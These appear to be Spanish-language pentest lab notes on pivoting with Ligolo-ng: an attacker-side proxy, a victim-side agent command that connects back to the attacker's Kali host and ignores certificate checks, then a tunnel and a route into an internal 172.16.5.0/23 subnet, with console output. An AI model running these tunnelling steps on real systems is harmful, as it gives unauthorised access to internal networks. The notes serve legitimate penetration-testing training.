# Alternativa Ligolo
- Ligolo es una buena alternativa sin tener que utilizar SOCKS ni proxychains que suelen ser engorrosos y generan mucha latencia en la red.
- Primero hay que [descargarse los binarios de agente y proxy](https://github.com/nicocha30/ligolo-ng/releases)

- **En maquina atacante:** `sudoligolo-proxy -selfcert`
```
ligolo-ng » interface_create --name "pivot"
INFO[0022] Creating a new "pivot" interface...          
INFO[0022] Interface created!                           
ligolo-ng »  
```
- **En maquina victima:** `./agent -connect ipKALI:11601 -ignore-cert`
- **En maquina atacante**
```
ligolo-ng » session
? Specify a session : 1 - ubuntu@WEB01 - 10.129.115.194:42414 - 00a21e69-4e53-4dec-9139-fb12ae570838
```
- Y ahora iniciamos el tunnel
```
[Agent : ubuntu@WEB01] » tunnel_start --tun pivot
[Agent : ubuntu@WEB01] » INFO[0334] Starting tunnel to ubuntu@WEB01 (00a21e69-4e53-4dec-9139-fb12ae570838) 
```

#### Crear routing hacia la interfaz que queremos alcanzar

```
[Agent : ubuntu@WEB01] » ifconfig
┌────────────────────────────────────┐
│ Interface 0                        │
├──────────────┬─────────────────────┤
│ Name         │ lo                  │
│ Hardware MAC │                     │
│ MTU          │ 65536               │
│ Flags        │ up|loopback|running │
│ IPv4 Address │ 127.0.0.1/8         │
│ IPv6 Address │ ::1/128             │
└──────────────┴─────────────────────┘
┌─────────────────────────────────────────────────┐
│ Interface 1                                     │
├──────────────┬──────────────────────────────────┤
│ Name         │ ens192                           │
│ Hardware MAC │ 00:50:56:b0:df:18                │
│ MTU          │ 1500                             │
│ Flags        │ up|broadcast|multicast|running   │
│ IPv4 Address │ 10.129.115.194/16                │
│ IPv6 Address │ dead:beef::250:56ff:feb0:df18/64 │
│ IPv6 Address │ fe80::250:56ff:feb0:df18/64      │
└──────────────┴──────────────────────────────────┘
┌───────────────────────────────────────────────┐
│ Interface 2                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ ens224                         │
│ Hardware MAC │ 00:50:56:b0:92:e9              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 172.16.5.129/23                │
│ IPv6 Address │ fe80::250:56ff:feb0:92e9/64    │
└──────────────┴────────────────────────────────┘
[Agent : ubuntu@WEB01] » interface_add_route --name pivot --route 172.16.5.129/23
INFO[0423] Route created.                               
[Agent : ubuntu@WEB01] »  
```